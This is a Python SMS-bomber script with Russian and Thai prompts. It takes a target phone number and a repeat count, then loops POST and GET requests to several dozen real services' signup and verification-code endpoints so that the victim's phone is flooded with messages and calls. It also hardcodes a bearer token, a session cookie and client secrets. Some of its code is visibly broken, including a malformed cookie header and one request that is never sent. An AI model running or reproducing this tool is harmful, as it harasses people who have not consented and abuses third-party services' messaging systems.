# Creator: batiscuff
# Last release: 14/05/2020
import requests, random, datetime, sys, time, argparse, os, json
from colorama import Fore, Back, Style


os.system("clear")
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
c_color = random.choice(colors)
nice = (Fore.YELLOW+Style.BRIGHT+"[+] "+
    Style.RESET_ALL+Fore.GREEN+Style.BRIGHT)
fail = (Fore.YELLOW+Style.BRIGHT+"[-] "+
    Style.RESET_ALL+Fore.RED+Style.BRIGHT)


def banner():
    os.system("clear")
    logo = """                 
           
█░█ ▄▀█ █▀▀ █▄▀   █▀▀ █▀█ █▀█ █░░
█▀█ █▀█ █▄▄ █░█   █▄▄ █▄█ █▄█ █▄▄CH          
              credit fivezone ติดตาม
    """
    clrs = print(c_color+logo+W)

def check_number():
    if phone:
        try:
            if int(phone) and len(phone) <= 13:
                global _phone
                _phone = phone # +380961114455
                if _phone[0] == '+':
                    _phone = _phone[1:]
                if _phone[0] == '0':
                    _phone = '38' + _phone
                if _phone[0] == '3':
                    _phone = _phone
            else:
                print(Fore.RED+Style.BRIGHT+"Номер введён некорректно!"+Style.RESET_ALL)
                exit()
        except ValueError:
            print(Fore.RED+Style.BRIGHT+"Номер введён некорректно!"+Style.RESET_ALL)
            exit()

def generate_info():
    global _phone9
    global _name
    global _email
    global password
    global username
    global junker_phone
    junker_phone = _phone[2:] 
    _phone9 = '+' +_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email


def start():
    info = Fore.BLUE+Style.BRIGHT+f'\n[เบอร์เป้าหมาย]{phone}\n[จำนวน] {count}'+'\nถ้าจะหยุดให้กดEXIT'+Style.RESET_ALL
    print(info)
    global iteration
    iteration = 0
    while iteration < count:
        try:
            data_frisor={"phone": _phone}
            frisor={
                'Content-type': 'application/json', 
                'Accept':"*/*",
                'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'cookie'"_chunk=1; ol3-0=po2YOaPtZc%252BHZHeVG7D7ZG%252BLV3UUNnejYANfRIc2aJod7cBWn4witm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
            
            # 1 раз в минуту
            print(nice+"Frizor отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Frizor не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone})
            print(nice+"Kasta отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Kasta не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"})
            print(nice+"IZI отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"IZI не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://junker.kiev.ua/postmaster.php", data={
            'tel': junker_phone,'name': _name,'action':'callme',
            })
            print(nice+"Junker Kiev отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Junker Kiev не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone})
            print(nice+"Youla отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Youla не отправлен"+Style.RESET_ALL)
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(nice+"MailRu Cloud отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"MailRu Cloud не отправлен"+Style.RESET_ALL)
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}")
            print(nice+"BELTELECOM3 отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"BELTELECOM3 не отправлен"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(nice+"Tinder отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Tinder не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": _phone9,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile",})
            print(nice+"Getmancar отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Getmancar не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
            print(nice+"ICQ отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"ICQ не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}})
            print(nice+"Pozichka отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Pozichka не отправлен"+Style.RESET_ALL)
        try:
            requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}')
            print(nice+"SecureOnline отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"SecureOnline не отправлен"+Style.RESET_ALL)
        try:
            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone))
            print(nice+"SportMaster отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"SportMaster не отправлен"+Style.RESET_ALL)
        try:
            requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9})
            print(nice+"Звонок отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Звонок не отправлен"+Style.RESET_ALL)
        try:
            requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone},)
            print(nice+"City24 отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"City24 не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"},)
            print(nice+"Helsi отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Helsi не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email})
            print(nice+"CloudMail отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"CloudMail не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://auth.multiplex.ua/login", json={"login": _phone},)
            print(nice+"Multiplex отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Multiplex не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},)
            print(nice+"MyGames отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"MyGames не отправлено"+Style.RESET_ALL)
        try:
            requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
            print(nice+"Planetakino отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Planetakino не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print(nice+"Tinder отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Tinder не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(nice+"Youla отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Youla не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': _phone9})
            print(nice+"LiST отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"LiST не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(nice+"MVideo отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"MVideo не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(nice+"Tinder отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Tinder не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(nice+"Twitch отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Twitch не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9})
            print(nice+"BelkaCar отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"BelkaCar не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(nice+"IVI отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"IVI не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
            requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone9})
            print(nice+"SportMaster, BelkaCar отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"SportMaster не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone})
            print(nice+"SecureOnline отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"SecureOnline не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"})
            print(nice+"NovaLiniya отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"NovaLiniya не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email})
            print(nice+"MPlanet отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"MPlanet не отправлено"+Style.RESET_ALL)
        try:
            requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(nice+"DELIMOBIL отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"DELIMOBIL не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone})
            print(nice+"Apteka 366 отправлено!"+Style.RESET_ALL)
        except:
            print("Apteka 366 не отправлено")
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={"phone":_phone})
            print(nice+"Belkacar отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Belkacar не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell":_phone})
            print(nice+"Друг Вокруг отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Друг Вокруг не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9})
            print(nice+"Energiia oтправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Energiia не отправлено"+Style.RESET_ALL)
        try:
            requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format(_phone9))
            print(nice+"Fundayshop oтправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Fundayshop не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
            print(nice+"Gorzdrav oтправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Gorzdrav не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9})
            print(nice+"KFC отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"KFC не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9})
            print(nice+"Viasat отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Viasat не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone})
            print(nice+"Yandex Food отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Yandex Food не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9))
            print(nice+"Сitilink отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Сitilink не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
            print(nice+"Yandex Eda отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Yandex Eda не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
            print(nice+"Dianet отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Dianet не отправлено"+Style.RESET_ALL)
        try:
            requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru",})
            print(nice+"Eldorado отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Eldorado не отправлено"+Style.RESET_ALL)
        try:
            requests.post("https://shafa.ua/api/v3/graphiql", json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },)
            print(nice+"Shafa отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Shafa не отправлено"+Style.RESET_ALL)
        iteration += 1
        print(Fore.CYAN+Style.BRIGHT+(f'\n{iteration} круг пройден.\n')+Style.RESET_ALL)
    os.system("clear")


def menu():
    print(Fore.CYAN+Style.BRIGHT+"[ยิงเบอร์] ตัวอย่าง +665334****"+Style.RESET_ALL)
    global phone
    phone = input(c_color+"ใส่เบอร์ "+W)
    check_number()
    print(Fore.CYAN+Style.BRIGHT+"[ยิงเบอร์] "+Style.RESET_ALL)
    global count
    count = input(c_color+">ใส่จำนวน<"+W)
    count = int(count)
    os.system("clear")
    generate_info()
    banner()
    start()
    banner()
    print(Fore.YELLOW+Style.BRIGHT+f"\nГотово.\nТелефон: {phone}\nКол-во пройденных циклов: {iteration}"+Style.RESET_ALL)






def main():
    banner()
    menu()

main()
